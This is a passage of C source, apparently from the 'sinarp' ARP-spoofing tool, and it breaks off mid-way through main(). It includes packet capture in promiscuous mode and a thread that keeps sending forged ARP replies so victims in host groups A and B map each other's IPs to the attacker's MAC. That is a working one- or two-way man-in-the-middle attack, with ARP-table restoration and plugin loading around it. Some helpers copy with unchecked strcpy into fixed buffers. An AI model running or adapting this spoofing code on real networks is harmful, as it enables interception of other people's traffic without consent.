    sinarp_printf("capture thread start ... \n");
    while (!g_is_time_shutdown)
    {
        ret = pf_pcap_loop(g_adhandle, 1, (pcap_handler)sinarp_packet_handler, NULL);
        if (ret == 0)
        {
            continue;
        }
        else
        {
            //pf_pcap_perror(g_adhandle,"break");
            break;
        }
    }
}

pcap_if_t *sinarp_get_ifs()
{
    pcap_if_t /* *dev, *pdev, *ndev,*/ *g_devs = NULL;
    char pcap_errbuf[PCAP_ERRBUF_SIZE];
    //DBG_MSG("enter : %s \n",__FUNCTION__);
    /* retrieve the list */
    if (pf_pcap_findalldevs((pcap_if_t **)&g_devs, pcap_errbuf) == -1)
    {
        //DBG_MSG("%s", pcap_errbuf);
        return NULL;
    }

    /* analize the list and remove unwanted entries */
    //    for (pdev = dev = (pcap_if_t *)g_devs; dev != NULL; dev = ndev)
    //   {
    /* the next entry in the list */
    //        ndev = dev->next;
    /* set the description for the local loopback */
    //        if (dev->flags & PCAP_IF_LOOPBACK)
    //        {
    //            SAFE_FREE(dev->description);
    //            dev->description = _strdup("Local Loopback");
    //        }

    /* fill the empty descriptions */
    //        if (dev->description == NULL)
    //            dev->description = dev->name;

    /* remove the pseudo device 'any' */
    //        if (!strcmp(dev->name, "any"))
    //        {
    /* check if it is the first in the list */
    //           if (dev == g_devs)
    //               g_devs = ndev;
    //           else
    //               pdev->next = ndev;
    //           SAFE_FREE(dev->name);
    //           SAFE_FREE(dev->description);
    //           SAFE_FREE(dev);
    //           continue;
    //       }
    /* remember the previous device for the next loop */
    //       pdev = dev;
    //DBG_MSG("capture_getifs: [%s] %s\n", dev->name, dev->description);
    //   }
    return g_devs;
}

int sinarp_show_ifs(pcap_if_t *g_devs)
{
    uint32 idx = 0;
    pcap_if_t *dev;
    sinarp_printf("\nList of available Network Interfaces:\n\n");
    for (dev = (pcap_if_t *)g_devs; dev != NULL; dev = dev->next)
    {
        sinarp_printf("%d. ", ++idx);
        sinarp_ifprint(dev);
    }
    return idx;
}

/*
根据网卡的序号返回网卡的
*/
pcap_if_t *sinarp_get_if_by_id(pcap_if_t *g_devs, uint32 id)
{
    uint32 idx = 0;
    pcap_if_t *dev;
    /* we are before ui_init(), can use printf */
    fprintf(stdout, "List of available Network Interfaces:\n\n");
    for (dev = (pcap_if_t *)g_devs; dev != NULL; dev = dev->next)
    {
        if (++idx == id)
            return dev;
    }
    return NULL;
}

uint32   sinarp_hostname_to_ip(char *hostname)
{
    struct hostent *he;
    struct in_addr **addr_list;
    int i;
    if ( (he = gethostbyname( hostname ) ) == NULL)
    {
        return inet_addr(hostname);
    }

    addr_list = (struct in_addr **) he->h_addr_list;

    for (i = 0; addr_list[i] != NULL; i++)
    {
        //Return the first one;
        return (*addr_list[i]).s_addr;
        //return inet_ntoa(*addr_list[i]) ;
    }
    return 0;
}

/*
只关注 ip  的最后一位  也就是 dword ip的第一位
*/
int  sinarp_parse_host_string(const char *host_string, host_type type)
{
    const char *p = host_string;
    char *slash = NULL;
    char buff[256];
    char startIpStr[256] = {0};
    uint32 start, end, range, submask, ip, idx;
    int bit;

    while ((p = sinarp_take_out_string_by_char(p, buff, 256, ',')))
    {
        start = end = range = submask = 0;
        if ((slash = strchr(buff, '/'))) //12.12.12.12/24
        {
            strncpy(startIpStr, buff, slash - buff );
            bit = atoi(slash + 1);
            if (bit < 24)
            {
                return 0;
            }
            range = 0xFFFFFFFF >> bit;
            submask = 0xFFFFFFFF << (32 - bit);
            ip = sinarp_hostname_to_ip(startIpStr);
            if (!ip)
            {
                DBG_MSG("host %s not find \n", startIpStr);
                return 0;
            }
            start = (ip & ntohl(submask)) + ntohl(1);
            end = (ip & ntohl(submask)) + ntohl(range - 1);

        }
        else if ((slash = strchr(buff, '-'))) //12.12.12.12 - 12.12.12.122
        {
            strncpy(startIpStr, buff, slash - buff );
            start = sinarp_hostname_to_ip(startIpStr);
            end = sinarp_hostname_to_ip(slash + 1);

        }
        else  //12.12.12.12
        {
            start = sinarp_hostname_to_ip(buff);
            end = start;
        }
        if ((start || end) && (htonl(start) <= htonl(end)))
        {
            start >>= 24;
            end >>= 24;
            for (idx = start  ; idx <= end ; idx ++)
            {
                g_HostList[idx].type = type;
            }
        }
    }
    return 1;
}


/* From tcptraceroute, convert a numeric IP address to a string */
#define IPTOSBUFFERS    12
char    *sinarp_iptos(u_long in)
{
    static char output[IPTOSBUFFERS][3 * 4 + 3 + 1];
    static short which;
    u_char *p;

    p = (u_char *)&in;
    which = (which + 1 == IPTOSBUFFERS ? 0 : which + 1);
    snprintf(output[which], sizeof(output[which]), "%d.%d.%d.%d", p[0], p[1], p[2], p[3]);
    return output[which];
}

char *sinarp_ip6tos(struct sockaddr *sockaddr, char *address, int addrlen)
{
    socklen_t sockaddrlen;

#ifdef WIN32
    sockaddrlen = sizeof(struct sockaddr_in6);
#else
    sockaddrlen = sizeof(struct sockaddr_storage);
#endif

    if (getnameinfo(sockaddr,
                    sockaddrlen,
                    address,
                    addrlen,
                    NULL,
                    0,
                    NI_NUMERICHOST) != 0) address = NULL;

    return address;
}

/*
通过网卡的名称（描述）来得到其mac地址 使用 windows 的API
*/
BOOL sinarp_get_mac_from_if_name(const char *if_name, uint8 *mac)
{
#ifdef WIN32
    PIP_ADAPTER_INFO pInfo = NULL, pInfoTemp = NULL;
    ULONG ulSize = 0;
    int i;
    GetAdaptersInfo(pInfo, &ulSize); // First call get buff size
    pInfo = (PIP_ADAPTER_INFO)malloc(ulSize);
    GetAdaptersInfo(pInfo, &ulSize);
    pInfoTemp = pInfo;
    while (pInfo)
    {
        if (strcmp(pInfo->AdapterName, if_name) >= 0)
        {
            for ( i = 0; i < (int)pInfo->AddressLength; i++)
                mac[i] = pInfo->Address[i];
            // Get Last Ip Address To szIPAddr
            //             PIP_ADDR_STRING pAddTemp=&(pInfo->IpAddressList);
            //             while(pAddTemp)
            //             {
            //                 strcpy(szIPAddr,pAddTemp->IpAddress.String);
            //                 pAddTemp=pAddTemp->Next;
            //             }
            //             if (strlen(pInfo->GatewayList.IpAddress.String) > 0)
            //                 strcpy(szGateIPAddr, pInfo->GatewayList.IpAddress.String);
            //             else
            //                 strcpy(szGateIPAddr, "N/A"); // Not Applicable
            free(pInfoTemp);
            return TRUE;
        }
        pInfo = pInfo->Next;
    }
    free(pInfoTemp);
    return FALSE;
#else //Linux 
    int s;
    int ret;
    struct ifreq buffer;
    s = socket(PF_INET, SOCK_DGRAM, 0);
    memset(&buffer, 0x00, sizeof(buffer));
    strcpy(buffer.ifr_name, if_name);
    ret = ioctl(s, SIOCGIFHWADDR, &buffer);
    close(s);
    if (ret != -1)
    {
        memcpy(mac, buffer.ifr_hwaddr.sa_data, 6);
        return TRUE;
    }
    sinarp_printf("%s\n", "sinarp_get_mac_from_if_name():ioctl failed !!");
    return FALSE;
#endif
}

#ifndef WIN32
// linux route
#define BUFSIZE 8192

struct route_info
{
    struct in_addr dstAddr;
    struct in_addr srcAddr;
    struct in_addr gateWay;
    char ifName[IF_NAMESIZE];
};


int readNlSock(int sockFd, char *bufPtr, int seqNum, int pId)
{
    struct nlmsghdr *nlHdr;
    int readLen = 0, msgLen = 0;

    do
    {
        /* Recieve response from the kernel */
        if ((readLen = recv(sockFd, bufPtr, BUFSIZE - msgLen, 0)) < 0)
        {
            //perror("SOCK READ: ");
            return -1;
        }

        nlHdr = (struct nlmsghdr *)bufPtr;

        /* Check if the header is valid */
        if ((NLMSG_OK(nlHdr, readLen) == 0) || (nlHdr->nlmsg_type == NLMSG_ERROR))
        {
            //perror("Error in recieved packet");
            return -1;
        }

        /* Check if the its the last message */
        if (nlHdr->nlmsg_type == NLMSG_DONE)
        {
            break;
        }
        else
        {
            /* Else move the pointer to buffer appropriately */
            bufPtr += readLen;
            msgLen += readLen;
        }

        /* Check if its a multi part message */
        if ((nlHdr->nlmsg_flags & NLM_F_MULTI) == 0)
        {
            /* return if its not */
            break;
        }
    }
    while ((nlHdr->nlmsg_seq != seqNum) || (nlHdr->nlmsg_pid != pId));

    return msgLen;
}

/* parse the route info returned */
void parseRoutes(struct nlmsghdr *nlHdr, struct route_info *rtInfo)
{
    struct rtmsg *rtMsg;
    struct rtattr *rtAttr;
    int rtLen;

    char buff[32];

    rtMsg = (struct rtmsg *)NLMSG_DATA(nlHdr);

    /* If the route is not for AF_INET or does not belong to main routing table then return. */
    if ((rtMsg->rtm_family != AF_INET) || (rtMsg->rtm_table != RT_TABLE_MAIN))
        return;

    /* get the rtattr field */
    rtAttr = (struct rtattr *)RTM_RTA(rtMsg);
    rtLen = RTM_PAYLOAD(nlHdr);

    //printf("start,..................\n");
    for (; RTA_OK(rtAttr, rtLen); rtAttr = RTA_NEXT(rtAttr, rtLen))
    {
        switch (rtAttr->rta_type)
        {
        case RTA_OIF:
            if_indextoname(*(int *)RTA_DATA(rtAttr), rtInfo->ifName);
            //printf("if: %s \n",rtInfo->ifName);
            break;
        case RTA_GATEWAY:
            memcpy(&rtInfo->gateWay, RTA_DATA(rtAttr), sizeof(rtInfo->gateWay));
            inet_ntop(AF_INET, &rtInfo->gateWay, buff, 32);
            //printf("gw:%s \n",buff);
            break;
        case RTA_PREFSRC:
            memcpy(&rtInfo->srcAddr, RTA_DATA(rtAttr), sizeof(rtInfo->srcAddr));
            inet_ntop(AF_INET, &rtInfo->srcAddr, buff, 32);
            //printf("src:%s \n",buff);
            break;
        case RTA_DST:
            memcpy(&rtInfo->dstAddr, RTA_DATA(rtAttr), sizeof(rtInfo->dstAddr));
            inet_ntop(AF_INET, &rtInfo->dstAddr, buff, 32);
            //printf("dst:%s \n",buff);
            break;
        default:
            break;
        }
    }
    return;
}

#endif

/*
通过 ip 查找其默认的网关地址
也是使用windows的API  不知道最后移植到 Linux 要怎么样搞
*/
BOOL sinarp_get_gw_from_ip(uint32 ip, uint32 *gw)
{
#ifdef WIN32
    PIP_ADAPTER_INFO pInfo = NULL;
    PIP_ADAPTER_INFO pInfoTemp = NULL;
    ULONG ulSize = 0;
    PIP_ADDR_STRING pAddTemp;
    GetAdaptersInfo(pInfo, &ulSize); // First call get buff size
    pInfo = (PIP_ADAPTER_INFO) malloc(ulSize);
    GetAdaptersInfo(pInfo, &ulSize);
    pInfoTemp = pInfo;
    *gw = 0;
    while (pInfo)
    {
        // Get Last Ip Address To szIPAddr
        pAddTemp = &(pInfo->IpAddressList);
        while (pAddTemp)
        {
            if (inet_addr(pAddTemp->IpAddress.String) == ip)
            {
                *gw = inet_addr(pInfo->GatewayList.IpAddress.String);
                free(pInfoTemp);
                return TRUE;
            }
            pAddTemp = pAddTemp->Next;
        }
        pInfo = pInfo->Next;
    }
    free(pInfoTemp);
    return FALSE;
#else  //linux
    struct nlmsghdr *nlMsg;
    struct rtmsg *rtMsg;
    struct route_info *rtInfo;
    char msgBuf[BUFSIZE]; // pretty large buffer

    int sock, len, msgSeq = 0;

    *gw = 0;

    /* Create Socket */
    if ((sock = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_ROUTE)) < 0)
    {
        perror("Socket Creation: ");
        return (-1);
    }

    /* Initialize the buffer */
    memset(msgBuf, 0, BUFSIZE);

    /* point the header and the msg structure pointers into the buffer */
    nlMsg = (struct nlmsghdr *)msgBuf;
    rtMsg = (struct rtmsg *)NLMSG_DATA(nlMsg);

    /* Fill in the nlmsg header*/
    nlMsg->nlmsg_len = NLMSG_LENGTH(sizeof(struct rtmsg)); // Length of message.
    nlMsg->nlmsg_type = RTM_GETROUTE; // Get the routes from kernel routing table .

    nlMsg->nlmsg_flags = NLM_F_DUMP | NLM_F_REQUEST; // The message is a request for dump.
    nlMsg->nlmsg_seq = msgSeq++; // Sequence of the message packet.
    nlMsg->nlmsg_pid = getpid(); // PID of process sending the request.

    /* Send the request */
    if (send(sock, nlMsg, nlMsg->nlmsg_len, 0) < 0)
    {
        fprintf(stderr, "Write To Socket Failed...\n");
        return -1;
    }

    /* Read the response */
    if ((len = readNlSock(sock, msgBuf, msgSeq, getpid())) < 0)
    {
        fprintf(stderr, "Read From Socket Failed...\n");
        return -1;
    }

    /* Parse and print the response */
    rtInfo = (struct route_info *)malloc(sizeof(struct route_info));

    for (; NLMSG_OK(nlMsg, len); nlMsg = NLMSG_NEXT(nlMsg, len))
    {
        memset(rtInfo, 0, sizeof(struct route_info));
        parseRoutes(nlMsg, rtInfo);

        // Check if default gateway
        if (rtInfo->dstAddr.s_addr == 0)
        {
            if ((rtInfo->gateWay.s_addr & 0x00FFFFFF) == (ip & 0x00FFFFFF))
            {
                //在一个子网里 就认为是对应的网关地址
                *gw = rtInfo->gateWay.s_addr;
                break;
            }
            // copy it over
            //inet_ntop(AF_INET, &rtInfo->gateWay, gatewayip, size);
            //break;
        }
    }

    free(rtInfo);
    close(sock);
    if (*gw)
        return TRUE;
    return FALSE;
#endif
}

/* Print all the available information on the given interface */
void sinarp_ifprint(pcap_if_t *d)
{
    pcap_addr_t *a;

    char ip6str[128];
    // struct sockaddr_dl *link;

    /* Name */
    printf("%s\n", d->name);

    /* Description */
    if (d->description)
        printf("\tDescription: %s\n", d->description);

    /* Loopback Address*/
    printf("\tLoopback: %s\n", (d->flags & PCAP_IF_LOOPBACK) ? "yes" : "no");

    /* IP addresses */
    for (a = d->addresses; a; a = a->next)
    {
        printf("\tAddress Family: #%d\n", a->addr->sa_family);

        switch (a->addr->sa_family)
        {
        case AF_INET:
            printf("\tAddress Family Name: AF_INET\n");
            if (a->addr)
                printf("\tAddress: %s\n", sinarp_iptos(((struct sockaddr_in *)a->addr)->sin_addr.s_addr));
            if (a->netmask)
                printf("\tNetmask: %s\n", sinarp_iptos(((struct sockaddr_in *)a->netmask)->sin_addr.s_addr));
            if (a->broadaddr)
                printf("\tBroadcast Address: %s\n", sinarp_iptos(((struct sockaddr_in *)a->broadaddr)->sin_addr.s_addr));
            if (a->dstaddr)
                printf("\tDestination Address: %s\n", sinarp_iptos(((struct sockaddr_in *)a->dstaddr)->sin_addr.s_addr));
            break;

        case AF_INET6:
            printf("\tAddress Family Name: AF_INET6\n");
            if (a->addr)
                printf("\tAddress: %s\n", sinarp_ip6tos(a->addr, ip6str, sizeof(ip6str)));
            break;
            // 貌似在 windows 上不能使用 winpcap 来获得 网卡的 MAC 地址 。还是的使用windows的API来搞。。

            // case AF_LINK:
            //      if(a->addr->sa_data != NULL)
            //       {
            // MAC ADDRESS
            //struct sockaddr_dl *sdl = (struct sockaddr_dl *) a->addr->sa_data;
            //link = (struct sockaddr_dl*)a->addr->sa_data;
            //if(link->sdl_alen)
            // char mac[link->sdl_alen];
            // caddr_t macaddr = LLADDR(link);
            //memcpy(mac, LLADDR(link), link->sdl_alen);

            //  if(link->sdl_alen == 6){
            // Seen in some sample code
            //         printf("%02x:%02x:%02x:%02x:%02x:%02x",
            //               (unsigned char)a->addr->sa_data[0],
            //               (unsigned char)a->addr->sa_data[1],
            //               (unsigned char)a->addr->sa_data[2],
            //               (unsigned char)a->addr->sa_data[3],
            //               (unsigned char)a->addr->sa_data[4],
            //              (unsigned char)a->addr->sa_data[5]);
            //}
            // else if(link->sdl_alen > 6)
            //  {
            // This is what happens in OSX 10.6.5
            //     sprintf(ret, "%02x:%02x:%02x:%02x:%02x:%02x",
            //         (unsigned char)mac[1],
            //          (unsigned char)mac[2],
            //         (unsigned char)mac[3],
            //        (unsigned char)mac[4],
            //         (unsigned char)mac[5],
            //         (unsigned char)mac[6]);
            // }
            // }
        default:
            printf("\tAddress Family Name: Unknown\n");
            break;
        }
    }
    printf("\n");
}

/*
发送欺骗数据包的线程
*/
#ifdef WIN32
DWORD __stdcall sinarp_spoof_thread(void *lparam)
#else
void *sinarp_spoof_thread(void *lparam)
#endif
{
    int i, j;
    g_is_spoof_thread_active = 1;
    do
    {
        switch (g_spoof_type)
        {
        case SPOOF_A:
        {
            //  A ---> M ---> B
            //向  A　中的主机发送　ARP　告诉　我　是　B　也就是 B 的 ip 对应我的 MAC 地址
            for (i = 0; i < 0xFF ; i++)
            {
                if (g_HostList[i].type == HOST_A && g_HostList[i].active == 1)
                {
                    for (j = 0 ; j < 0xFF; j++)
                    {
                        if (g_HostList[j].type == HOST_B && g_HostList[j].active == 1)
                        {
                            sinarp_arp_spoof(g_HostList[i].ip, g_HostList[i].mac, g_HostList[j].ip, g_my_mac);
                        }
                    }
                }
            }
        }
        break;
        case SPOOF_AB:
        {
            // A　<---> M <---> B
            //告诉　A 我是 B
            for (i = 0; i < 0xFF ; i++)
            {
                if (g_HostList[i].type == HOST_A && g_HostList[i].active == 1)
                {
                    for (j = 0 ; j < 0xFF; j++)
                    {
                        if (g_HostList[j].type == HOST_B && g_HostList[j].active == 1)
                        {
                            sinarp_arp_spoof(g_HostList[i].ip, g_HostList[i].mac, g_HostList[j].ip, g_my_mac);
                        }
                    }
                }
            }
            //告诉 B　我是　A
            for (i = 0; i < 0xFF ; i++)
            {
                if (g_HostList[i].type == HOST_B && g_HostList[i].active == 1)
                {
                    for (j = 0 ; j < 0xFF; j++)
                    {
                        if (g_HostList[j].type == HOST_A && g_HostList[j].active == 1)
                        {
                            sinarp_arp_spoof(g_HostList[i].ip, g_HostList[i].mac, g_HostList[j].ip, g_my_mac);
                        }
                    }
                }
            }
        }
        break;
        default:
            break;
        }
#ifdef WIN32
        Sleep(g_interval);
#else //Linux 
        Sleep(g_interval);
#endif
    }
    while (g_is_time_shutdown == 0);
    g_is_spoof_thread_active = 0;
    return 0;
}

#ifdef WIN32
DWORD _stdcall sinarp_capture_thread(void *lparam)
{
    g_is_capture_thread_active = 1;
    sinarp_do_capture();
    g_is_capture_thread_active = 0;
    return 0;
}
#else
void   *sinarp_capture_thread(void *lparam)
{
    g_is_capture_thread_active = 1;
    sinarp_do_capture();
    g_is_capture_thread_active = 0;
    return 0;
}
#endif

#ifdef WIN32
void sinarp_create_thread(DWORD  (__stdcall *func)(void *), void *lparam)
{
    CreateThread(NULL, 0, func, lparam, 0, NULL);
}
#else //for Linux 
void sinarp_create_thread(void * ( *func)(void *), void *lparam)
{
    //CreateThread(NULL,0,func,lparam,0,NULL);
    pthread_t thread_id;
    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
    pthread_create(&thread_id, &attr, func, lparam);
    pthread_attr_destroy(&attr);
}
#endif

#ifdef WIN32

int ctrlc = 0;

BOOL WINAPI HandlerRoutine(DWORD fdwCtrlType)
{
    switch (fdwCtrlType)
    {
        // Handle the CTRL-C signal.
    case CTRL_C_EVENT:
    case CTRL_CLOSE_EVENT:
    case CTRL_BREAK_EVENT:
    case CTRL_LOGOFF_EVENT:
    case CTRL_SHUTDOWN_EVENT:
        ctrlc++;
        if (ctrlc == 2)
            return FALSE;
        if (ctrlc == 3)
            exit(88);
        printf("\r\nCtrl+C Is Pressed.\r\n"); // 前面的 \n 是避免输出混乱 ~~
        Sleep(200);
        g_is_time_shutdown = 1; //通知线程退出。。。。
        pf_pcap_breakloop(g_adhandle);
        return TRUE; //不从这里退出
    default:
        return FALSE;
    }
}
#else
void  cleanup(int s)
{
    printf("\r\nCtrl+C Is Pressed.\r\n"); // 前面的 \n 是避免输出混乱 ~~
    Sleep(200);
    g_is_time_shutdown = 1; //通知线程退出。。。。
    pf_pcap_breakloop(g_adhandle);
    Sleep(2500);
}
#endif

void sinarp_restore_arp_table()
{
    //从主机列表里面取出正确的 ip 对应的 mac
    int i, j;
    switch (g_spoof_type)
    {
    case SPOOF_A:
    {
        for (i = 0; i < 0xFF ; i++)
        {
            if (g_HostList[i].type == HOST_A && g_HostList[i].active == 1)
            {
                for (j = 0 ; j < 0xFF; j++)
                {
                    if (g_HostList[j].type == HOST_B && g_HostList[j].active == 1)
                    {
                        sinarp_arp_spoof(g_HostList[i].ip, g_HostList[i].mac, g_HostList[j].ip, g_HostList[j].mac);
                    }
                }
            }
        }
    }
    break;
    case SPOOF_AB:
    {
        for (i = 0; i < 0xFF ; i++)
        {
            if (g_HostList[i].type == HOST_A && g_HostList[i].active == 1)
            {
                for (j = 0 ; j < 0xFF; j++)
                {
                    if (g_HostList[j].type == HOST_B && g_HostList[j].active == 1)
                    {
                        sinarp_arp_spoof(g_HostList[i].ip, g_HostList[i].mac, g_HostList[j].ip, g_HostList[j].mac);
                    }
                }
            }
        }
        //告诉 B　我是　A
        for (i = 0; i < 0xFF ; i++)
        {
            if (g_HostList[i].type == HOST_B && g_HostList[i].active == 1)
            {
                for (j = 0 ; j < 0xFF; j++)
                {
                    if (g_HostList[j].type == HOST_A && g_HostList[j].active == 1)
                    {
                        sinarp_arp_spoof(g_HostList[i].ip, g_HostList[i].mac, g_HostList[j].ip, g_HostList[j].mac);
                    }
                }
            }
        }
    }
    break;
    default:
        break;
    }
}

void sinarp_parse_plugin_string(const char *plugin_string)
{
    char buff[256];
    const char *p = plugin_string;
    while ((p = sinarp_take_out_string_by_char(p, buff, 256, ',')))
    {
        if (FALSE == sinarp_load_plugin(buff))
        {
            sinarp_printf("Failed to load plugin %s !\n", buff);
        }
    }
}


/*=======================================
from NetFuke src
Name:   b_FindStringByFlag
Usage:  取得标记中间的字符串
入力1:    字符串指针
入力1:    标志1
入力1:    标志2
入力1:    输出缓冲区
入力2:    输出缓冲区大小
返回值:  是否有值
========================================*/
BOOL sinarp_find_string_by_flag(
    const char     *p_szContent,
    const char     *p_szFlag1,
    const char     *p_szFlag2,
    char           *p_szValue,
    const uint32    i4_ValuseSize
)
{
    char    szContent[65535];
    char   *p_szFlag1Index  = NULL;
    char   *p_szFlag2Index  = NULL;

    // 有效性检测
    if ( ( p_szContent == NULL ) || ( p_szValue == NULL ) )
    {
        return FALSE;
    }

    // 备份字符串
    strcpy( szContent, p_szContent );

    // 找到第一个Flag
    p_szFlag1Index = strstr( szContent, p_szFlag1 );

    if ( p_szFlag1Index )
    {
        // 找到第二个Flag
        p_szFlag1Index += strlen( p_szFlag1 );
        p_szFlag2Index = strstr( p_szFlag1Index, p_szFlag2 );

        if ( p_szFlag2Index )
        {
            *p_szFlag2Index = '\0';

            // 长度检测
            if ( strlen( p_szFlag1Index ) >= i4_ValuseSize )
            {
                strncpy( p_szValue , p_szFlag1Index, i4_ValuseSize - 1 );
            }
            else
            {
                strcpy( p_szValue , p_szFlag1Index );
            }
            return TRUE;
        }
    }
    return FALSE;
}

#ifndef WIN32
int setsignal(int sig, void (* func)(int))
{
    struct sigaction old, new;

    memset(&new, 0, sizeof(new));
    new.sa_handler = func;
    if (sigaction(sig, &new, &old) < 0)
        return (int)(SIG_ERR);
    return (int)(old.sa_handler);
}
#endif

char *sinarp_bin2hex(unsigned char *buff, int size)
{
    int i;
    char tab[16] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F'};
    char *dest = (char *)malloc(size * 2 + 1);
    for (i = 0 ; i < size; i++)
    {
        dest[i * 2] = tab[buff[i] >> 4];
        dest[i * 2 + 1] = tab[buff[i] & 0x0F];
    }
    dest[size * 2] = 0;
    return dest;
}

// convert ABCD... to \xAB\xCD
unsigned char   *sinarp_hex2bin(char *hex, int len)
{
    int i;
    unsigned char *Outbuff = (unsigned char *)malloc(len);
    unsigned char  HexChar[256];
    if (NULL == Outbuff)
        return NULL;
    memset(HexChar, 0, sizeof(HexChar));
    HexChar[0] = '0';
    HexChar[1] = '1';
    HexChar[2] = '2';
    HexChar[3] = '3';
    HexChar[4] = '4';
    HexChar[5] = '5';
    HexChar[6] = '6';
    HexChar[7] = '7';
    HexChar[8] = '8';
    HexChar[9] = '9';
    HexChar[0xA] = 'A';
    HexChar[0xB] = 'B';
    HexChar[0xC] = 'C';
    HexChar[0xD] = 'D';
    HexChar[0xE] = 'E';
    HexChar[0xF] = 'F';
    HexChar['0'] = 0;
    HexChar['1'] = 1;
    HexChar['2'] = 2;
    HexChar['3'] = 3;
    HexChar['4'] = 4;
    HexChar['5'] = 5;
    HexChar['6'] = 6;
    HexChar['7'] = 7;
    HexChar['8'] = 8;
    HexChar['9'] = 9;
    HexChar['A'] = 0xA;
    HexChar['B'] = 0xB;
    HexChar['C'] = 0xC;
    HexChar['D'] = 0xD;
    HexChar['E'] = 0xE;
    HexChar['F'] = 0xF;
    HexChar['a'] = 0xA;
    HexChar['b'] = 0xB;
    HexChar['c'] = 0xC;
    HexChar['d'] = 0xD;
    HexChar['e'] = 0xE;
    HexChar['f'] = 0xF;

    for (i = 0; i < len; i += 2)
    {
        unsigned char a = hex[i];
        unsigned char b = hex[i + 1];
        if ((0 == a && '0' != a) || (0 == b && '0' != hex[i + 1]))
        {
            break;
        }
        Outbuff[i / 2] = (HexChar[a] << 4) + HexChar[b];
    }
    if (i < len)
    {
        free(Outbuff);
        return NULL;
    }
    return Outbuff;
}

void strupr (char *str)
{
    while (*str)
    {
        *str = toupper (*str) ;
        str ++ ;
    }
}

//http://www.linuxmisc.com/18-writing-Linux-applications/aa7b8b9675a92ec7.htm

// convert ab:cd:ef:12:34:56 to  \xAB\xCD\xEF\x12\x34\x56
int sinarp_mac_from_string(char *str, char mac[6])
{
    int i = 0;
    char *p = str;
    char mac_str[32];
    unsigned char *pmac ;
    memset(mac_str, 0, sizeof(mac_str));
    //strncpy(p,str,32);
    while (*p)
    {
        if (*p != ':')
        {
            mac_str[i] = *p;
            ++i;
        }
        p++;
    }
    strupr(mac_str);
    pmac = sinarp_hex2bin(mac_str, strlen(mac_str));
    if (NULL == mac)
    {
        DBG_MSG("%s:bin2hex failed !!", __func__);
        return 0;
    }
    memcpy(mac, pmac, 6);
    free(pmac);
    return 1;
}

int sinarp_add_host_list(uint32 ip, unsigned char mac[6])
{
    if ((ip & 0x00FFFFFF) == (g_my_ip & 0x00FFFFFF))
    {
        memcpy(g_HostList[ip >> 24].mac, mac, 6);
        g_HostList[ip >> 24].active = 1;
        g_HostList[ip >> 24].ip = ip;
        return 1;
    }
    return 0;
}

void sinarp_process_mac_string(char *mac_string)
{
    const char *p = mac_string;
    char buff[256];
    char ip[32];
    unsigned char mac[6];
    char *pmac;
    uint32 uip;
    char *slash;

    while ((p = sinarp_take_out_string_by_char(p, buff, 256, ',')))
    {
        if ((slash = strchr(buff, '-'))) //12.12.12.12/24
        {
            memset(ip, 0, sizeof(ip));
            strncpy(ip, buff, slash - buff );
            pmac = slash + 1;
            if (sinarp_mac_from_string(pmac, (char *)mac))
            {
                uip = inet_addr(ip);
                if (0 != uip)
                {
                    DBG_MSG("%s:ip:%s mac %.2X:%.2X:%.2X:%.2X:%.2X:%.2X\n",
                            __func__,
                            ip,
                            mac[0],
                            mac[1],
                            mac[2],
                            mac[3],
                            mac[4],
                            mac[5]);
                    if (0 == sinarp_add_host_list(uip, mac))
                    {
                        DBG_MSG("%s: add to host list failed !", __func__);
                    }
                }
            }
            else
            {
                DBG_MSG("%s get mac failed \n", __func__);
            }
        }
    }
}

/*
sinarp -i 0 -A 12,3,4,22,31,54 -B 123,11,234
*/

int  main(int argc , char **argv)
{
    uint32 idx = 0;
    uint32 host_count = 0;
    uint32 active_count_A, active_count_B;
    uint32 M_ip = 0;
    pcap_addr_t *a;
    uint32 i;
    struct bpf_program fcode;
    pcap_if_t *pdevs, *open_devs;
    char errbuf[PCAP_ERRBUF_SIZE];
    char sniffer_filter[256];
    char *plugin_string = NULL;//先保存 插件字符串 等一些全局变量都初始化好了 再加载插件
    char *mac_string = NULL;
    //  char cwd[4096];
    pdevs = open_devs = NULL;
#ifndef WIN32
    setvbuf(stdout, NULL, _IOLBF, 0);  // no effect ??? !!!
#endif
#ifdef WIN32
    SetConsoleCtrlHandler(HandlerRoutine, TRUE);
#else
    (void)setsignal(SIGPIPE, cleanup);
    (void)setsignal(SIGTERM, cleanup);
    (void)setsignal(SIGINT, cleanup);
#endif
    // init global val
    memset(g_HostList, 0, sizeof(g_HostList));
    //  getcwd(cwd,4096);
    //  printf("%s\n",cwd);
    //  if(-1 == setenv("LD_LIBRARY_PATH",cwd,1))
    //  {
    //      perror("setenv():");
    //  }
    //  printf("%s\n",getenv("LD_LIBRARY_PATH"));  //实践证明这样设置时没有用的。。
    sinarp_copyright_msg(); //版权信息
    if (!sinarp_init_pcap_funcs())
    {
        printf("init winpcap failed !\n");
        return -1;
    }
    if (argc < 2)
    {
        sinarp_show_help_msg();
        pdevs = sinarp_get_ifs();
        if (pdevs == NULL)
        {
            printf("Failed to get the adapter information~~\n");
            return -1;
        }
        sinarp_show_ifs(pdevs);
        pf_pcap_freealldevs(pdevs);
        return 0;
    }

    for (idx = 2 ; idx <= argc ; idx ++)
    {
        if (stricmp(argv[idx - 1], "-A") == 0)
        {
            sinarp_parse_host_string(argv[idx], HOST_A);
        }
        else if (stricmp(argv[idx - 1], "-M") == 0)
        {
            //根据中间人的ip 来确定 ip 的前3位  netmask 定死为 255.255.255.0
            M_ip = sinarp_hostname_to_ip(argv[idx]);
            if (M_ip == 0)
            {
                sinarp_printf("unknown M host : %s\n", argv[idx]);
                goto clean;
            }
        }
        else if (stricmp(argv[idx - 1], "-B") == 0)
        {
            sinarp_parse_host_string(argv[idx], HOST_B);
        }
        else if (stricmp(argv[idx - 1], "-i") == 0)
        {
            pdevs = sinarp_get_ifs();
            open_devs = sinarp_get_if_by_id(pdevs, (uint32)atoi(argv[idx]));
            if (!open_devs)
            {
                sinarp_printf("pleaser input a right id !\n");
                goto clean;
            }
            sinarp_printf("use Interfaces : %s\n", open_devs->name);
            if ((g_adhandle = pf_pcap_open_live(open_devs->name, // device
                                                65536,     // portion of the packet to capture.
                                                // 65536 grants that the whole packet will be captured on all the MACs.
                                                1,       // promiscuous mode
                                                1, //a value of 0 means no time out
                                                errbuf     // error buffer
                                               )) == NULL)
            {
                sinarp_printf("\r\nUnable to open the adapter. \
